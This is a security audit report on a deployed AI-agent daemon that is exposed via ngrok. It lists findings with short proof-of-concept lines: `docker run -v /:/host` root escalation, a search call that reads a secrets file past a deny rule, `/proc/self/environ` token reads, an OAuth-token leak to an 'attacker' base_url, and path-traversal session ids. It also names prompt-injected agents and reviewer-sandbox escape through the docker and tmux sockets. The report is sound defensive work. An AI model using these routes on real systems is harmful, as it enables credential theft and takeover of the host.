# Security audit: deployed ycc system (2026-10-26)

Deployment audited: `ycc daemon --web` (pid 2463299, started Oct 22, binary built between the
Oct-6 fixes and Oct 23) bound to `127.0.0.1:8787`, `YCC_TOKEN` set, published at
`https://random-app-thing.ngrok.dev` via `ngrok http 8787 --inspect=false` (user unit
`ycc-ngrok`). Host is the multi-user dev box (ian/clover/hailey, host-networked containers).

Method: four parallel read-only review agents (glm — adversarial HTTP/pre-auth probing of the
live daemon + scratch `buildHandler` harness; opus — code audit of everything new since the
Oct-6 fixes; astra — web client sink/dependency audit; claude — token→shell→workstation chain
and host exposure), with the coordinator independently re-verifying every CRITICAL/HIGH claim
and the top code findings. Secrets were never printed; token/key presence was confirmed via
`grep -cF` counts and SHA-256 prefix comparison.

## Status of the 2026-10-06 audit (docs/reports/security-audit-2026-10.md)

All four fix commits (5e23b96, 0314c7a, ab9ef80, 59ee60b) are **deployed in the running binary**
(confirmed by `strings` of `/proc/2463299/exe` finding the guardrail/token-file messages).
Re-verified live: unauthenticated 33 MB POST → 401 in ~30 ms before the body is read, locally
and through ngrok; ngrok inspector off (`web_addr: false`, :4040 closed); `--web`/non-loopback
guardrails hold; every one of the 70 Connect methods requires the bearer token; pre-auth
rejection never reads or decompresses the body (gzip bombs without a token → 401 in
milliseconds). F1/F2/F5 of the old audit are fixed in deployment. **F3 (token rotation) never
happened** — see T1.

## Findings

### T1 — CRITICAL (operational) — Weak token still live, never rotated, and persisted in 8+ places

The daemon still runs with the pre-rotation hand-chosen `YCC_TOKEN` (22 chars, `[a-z0-9]`, 12
distinct characters — matching the old audit's F3 profile), while the strong CSPRNG token
(`~/.local/state/ycc/daemon-token`, 64 hex) sits unused. Coordinator-verified copies of the
live token on disk (occurrence counts, never the value):

| Location | Mode | Count |
|---|---|---|
| `~/.bash_history` (`YCC_TOKEN=… ycc daemon --web`) | 600 | 12 |
| `.ycc/sessions/s_d00c2246f0918dfe/events.jsonl` | **644** | 9 |
| `.ycc/sessions/s_a8223d64edab39f0/events.jsonl` | 600 | 5 |
| `.ycc/sessions/s_8055eb4d7ddd2554/events.jsonl` | **644** | 2 |
| `.ycc/sessions/s_414837b2057ad83f/events.jsonl` | 600 | 2 |
| `.ycc/session-view.sqlite` (+ lamia copy) | 600 | 1 |
| `.ycc/tmp/slowaudit/sessions.pkl` | **664** | 29 |
| daemon process env, tmux pane scrollback (`.ycc/redeploy.sh` re-sends it via `tmux send-keys`) | — | — |

None is world-readable (`/home/why` 0750, `.ycc` 0700), but **every agent can read all of
them**: the file-tool deny covers only `~/.config/ycc/**` and `daemon-token`, not `.ycc/sessions`
or `~/.bash_history`. A prompt-injected agent (or a malicious repo driving one) that finds any
copy gets persistent remote access — and per T3, that is root-equivalent.

**Fix:** rotate to the existing 64-hex `daemon-token` (stop passing `YCC_TOKEN` on the command
line; use a 0600 `EnvironmentFile=` systemd --user unit or rely on the state-dir token);
scrub/delete the two 644 event logs, the sqlite projections, `sessions.pkl`, and the
`.bash_history` line; redact `Bearer <token>` and known secret values in tool-result emission
(the `safeSecretOutput` mechanism for the Exa key in `internal/tools/web.go` is the model).

### T2 — CRITICAL (operational) — Live Anthropic API key in a 0644 session log

`.ycc/sessions/s_2a289a4ad44dc96a/events.jsonl` (mode 644, 2026-07-06 autonomous run) contains a
full dump of `secrets.json`; the `sk-ant-…` key in it **is the live key** (SHA-256 prefix
`6dd0a3ae8a9a` matches `~/.config/ycc/secrets.json`, coordinator-verified). This is the F6
"Bash can `cat` secrets.json" reality: the deny is documented as defense-in-depth, and the
tool output flowed into the durable log verbatim.

**Fix:** rotate the Anthropic key; delete/scrub that log; add an emit-time redaction pass over
tool results for every value present in `secrets.json`; default session logs and dirs to 0600
(447 of 3552 `events.jsonl` are not 0600; session dirs are 0755 — harmless only because the
`.ycc` parent is 0700).

### T3 — CRITICAL (design) — Token holder = unconfined shell as `why` = root on this host

Agent Bash (coordinator/implementer/chat roles) is `sh -c` with the daemon's scrubbed env, no
sandbox, no allowlist (`internal/tools/worker.go:1458,1567`); `internal/sandbox` is used **only
for the reviewer role**, and there is no config knob to confine anything else. User `why` is in
the `docker` and `sudo` groups (`docker:x:999:why,ian,hailey`), so any shell as `why` is root
(`docker run -v /:/host …`). The reviewer sandbox was probed from inside: `/` is read-only and
scratch is confined, **but** `docker ps` and `tmux list-panes`/`send-keys` both work from it
(sockets not masked), so even a "read-only reviewer" can pivot to root or inject keystrokes
into the user's live shell pane.

**Fix:** mask `/var/run/docker.sock`, `/tmp/tmux-*` (and ideally loopback) in the sandbox
helper; run agents under a dedicated uid/container without docker/sudo access; until then,
treat the bearer token as a root credential.

### T4 — HIGH (operational) — ngrok publishes the daemon to the internet with the token as the only gate

`ngrok.yml` has no traffic-policy, OAuth, IP restriction, or mTLS — the web UI is served
unauthenticated at `/` (by design, gives attackers a ready-made UI and full service
identification) and every RPC's only gate is the bearer token. There is **no failed-auth rate
limiting and no failed-auth logging** (the latency interceptor sits inside auth, so 401s are
invisible), and the token's entropy is weak (T1). Local brute force is unbounded: other local
processes and host-networked containers reach `127.0.0.1:8787` directly at high rps, bypassing
ngrok.

**Fix:** rotate (T1), add failed-auth throttling + logging in `RequireBearer`
(`internal/server/auth.go:27`), and add an ngrok edge gate (OAuth/IP restriction) or switch to
Tailscale with identity — the token must not be the only thing between the internet and root.

### T5 — MEDIUM — Search tool bypasses the credential deny (F6 fix gap; opus, code-verified)

`internal/tools/search.go:220` runs `ws.resolveRead(scope)` on the search root only
(`denyCredentialPath`, `tools.go:515-532`), then ripgrep recurses — matches are never re-checked.
PoC (scratch harness): `Search{pattern:"REFRESHTOKEN", path:"$HOME"}` returned the
`~/.config/ycc/secrets.json` match; the state-dir `daemon-token` is exposed the same way via
`path:"~/.local/state"`. This defeats the Oct-6 deny for **every** role that has Search,
including reviewers. Also: `denyCredentialPath` does not block `/proc/*/environ` (Read
`/proc/self/environ` returns the daemon's own environment, including `YCC_TOKEN`), and an
agent's Bash can read the daemon's env via `/proc/$PPID/environ` (same-uid) even though it is
scrubbed from the child env.

**Fix:** deny scopes that are ancestors of protected locations (or re-check every match);
deny `/proc`/`/sys` paths in `denyCredentialPath`; set `PR_SET_DUMPABLE=0` on the daemon and
read the token from a file instead of the environment; note `internal/projectfs/projectfs.go:236`
and a few other internal `git` calls still run unscrubbed (a `core.fsmonitor` hook sees
`YCC_TOKEN`) — route all execs through one scrubbed-env helper with
`-c core.fsmonitor=false -c core.hooksPath=/dev/null` for daemon-internal git.

### T6 — LOW-MEDIUM — Session-id path traversal in ResumeSession / GetSessionTranscript / GetSessionAttachment

`Manager.Reopen` (`session/session.go:3046+`), `SessionTranscript`, and `SessionAttachment`
join the client-supplied id into the log path with no validation
(`filepath.Join(absWS, ".ycc", "sessions", id, "events.jsonl")`). PoCs: a transcript request
with `../../../…` returned another project's history; `ResumeSession` on a crafted id
chmodded a foreign directory to 0700 and created `events.jsonl` in it; a Resume pointed at a
foreign log made it a **live session of the requesting project** that `SendInput` continues
with forged history. (ed2184f's `persistedSessionProject` validation covers SendInput/Answer
only.) Token-gated, so this is cross-project history read/tamper + targeted filesystem
mutation, not remote unauth access.

**Fix:** one strict `validSessionID` (`^s_[0-9a-f]+$`) check in Reopen, SessionTranscript,
SessionAttachment, SessionLogPath; open attachments with `O_NOFOLLOW`.

### T7 — MEDIUM — Authenticated CPU drain via gzip bomb (glm, harness-verified; defense-in-depth)

connect-go v1.20.0's `Decompress` (`compression.go:82-107`) drains the whole bomb **after** the
`ReadMaxBytes` cap trips, just to count discarded bytes for the error message: a 31 MB wire
body expanding to ~32 GiB burns ~10 s of a core (memory stays bounded — verified; and the
client disconnecting does not cancel it). Requires a valid token, hence MEDIUM.

**Fix:** reject any request `Content-Encoding` in front of the Connect handler (ycc's own
clients never gzip requests), and/or file upstream to stop the drain. Note the 429 also
discloses the exact decompressed size.

### T8 — LOW/MEDIUM — Credential-forwarding leftovers (F9), trusted repo config, misc

- **OAuth token exfil:** `DiscoverModels{backend:"anthropic", base_url:"https://attacker"}`
  still sends the stored Claude OAuth access token to any HTTPS host
  (`config.go:1465-1468`; `validateModelCredentials` only requires https); any non-reserved
  env var/secret (`ANTHROPIC_API_KEY`, `GITHUB_TOKEN`, …) likewise. `credenv.Register` also
  runs before discovery succeeds, so a bogus `KeyEnv:"PATH"` strips PATH from every agent
  subprocess for the daemon's lifetime (DoS).
- **Repo `[worktree]` config is trusted without prompting** (`session.go:2154`,
  `bootstrap.go:48`): a cloned repo gets `setup` shell execution on its first workstream;
  `copyBootstrapPath` (`bootstrap.go:64`) checks paths lexically only, so a symlinked dir
  copies `secrets.json` into the worktree where the deny does not apply.
- **`stateDir()` / uianalytics fall back to `os.TempDir()`** when HOME is unset → 0755 dirs
  in shared /tmp; fail closed instead.
- **Web client:** "Forget token" only clears the acting tab's module state — other tabs keep
  the in-memory token and stay authorized (no `storage`-event/BroadcastChannel sync). PDF
  previews now render in a same-origin `blob:` iframe without `sandbox` (CSP `frame-src blob:`)
  — content-based MIME detection is sound and no exploit was found, but it's a new trust
  boundary; prefer a sandboxed/isolated viewer or download-only.
- **Pre-auth signals:** `POST /debug/latency` gets a pre-auth 405 from the ServeMux (route +
  method disclosure, no data); `OPTIONS *` → 200; ServeMux 307-redirects `..` paths to a
  cleaned same-origin path. Noise-level.
- **uianalytics:** "owner-only" means file modes only — every token holder can read/write all
  analytics; unbounded catalog growth (1000 entries/client name); consider a client-name
  allow-list and caps.

### T9 — LOW — Adjacent host exposure (workstation-takeover context, beyond ycc)

`ian` and `hailey` are also in `docker`+`sudo` (root-equivalent; only `clover` is confined by
the 0700 walls). LAN/Tailscale-reachable unauthenticated services probed once each:
RedisInsight :8001 (full Redis access via UI), Prometheus :9090 and node_exporter :9100
(host metrics), Grafana :3000 (login page), `python -m http.server` :8000, Lamia :8791,
nvidia_smi_exporter :9835. None grants exec as `why`; qdrant/immich published ports were not
answering. `~/.ssh/authorized_keys` 0600, 9 ed25519 keys; git hooks are samples only; no
cron/systemd user units found.

**Fix:** bind the helper UIs to loopback/Tailscale; reconsider docker/sudo membership.

## Verified solid (highlights)

- All 70 Connect methods (unary + streaming, json/grpc/grpc-web/connect protocols) require the
  token; pre-auth middleware never reads/decompresses the body; constant-time compare; no
  per-method gaps are structurally possible (prefix wrap + interceptor).
- Native h2c/prior-knowledge HTTP/2 changes nothing pre-auth; `Host` is never consulted when a
  token is set (no DNS rebinding); embedded-FS web handler immune to traversal; timeouts,
  header limits, and stream caps are in place.
- Oct-6 fixes hold at HEAD: credential scrubbing covers foreground/background Bash, sandbox,
  rg, git review env, bootstrap, workstream integrate; reserved-name + HTTPS model-RPC checks;
  `llmhttp.CheckRedirect` on all credential-bearing clients; `--web`/loopback guardrails.
- Web client: no HTML/eval sinks anywhere (incl. new Activity/inbox/usage panels); markdown
  lexer-only with allow-listed links; token only in localStorage/Authorization, never URLs;
  raster-only attachment allow-list holds against SVG/MIME-param/data-URL variants; deps and
  lockfile clean (Darwin-only fsevents hook); dist manifest matches a fresh typecheck/build
  hash. Connect transport uses `redirect: "error"`.
- Secrets at rest are 0600 in 0700 dirs with a verified parent chain; state `daemon-token`
  is CSPRNG 64-hex 0600; SSH keys 0600; `.git/hooks` samples only.
- Workstream paths use `ContainedPath`/`VerifyUnderRoot`, re-verified before removal; no
  client-path RemoveAll; activity SQL parameterized; GetJobOutput session-scoped and capped.

## Recommended order

1. **Now (operational):** rotate `YCC_TOKEN` to the 64-hex state-file token (stop putting it on
   command lines/tmux) and rotate the Anthropic key; scrub the two 644 event logs, the sqlite
   projections, `sessions.pkl`, and the `.bash_history` line (T1, T2).
2. **Outer gate:** ngrok traffic-policy OAuth/IP restriction (or Tailscale), plus
   failed-auth rate limiting/logging in `RequireBearer` (T4).
3. **Contain the blast radius:** mask docker/tmux sockets and loopback in the sandbox; plan a
   dedicated uid for the daemon/agents; reconsider `why`'s docker-group membership (T3).
4. **Code fixes:** Search re-check + `/proc` deny + `PR_SET_DUMPABLE` (T5); session-id
   validation (T6); emit-time secret redaction + 0600 default logs (T2); reject request
   `Content-Encoding` pre-Connect (T7); OAuth-fallback/`base_url` tightening and
   `credenv.Register` ordering (T8); forget-token tab sync (T8).
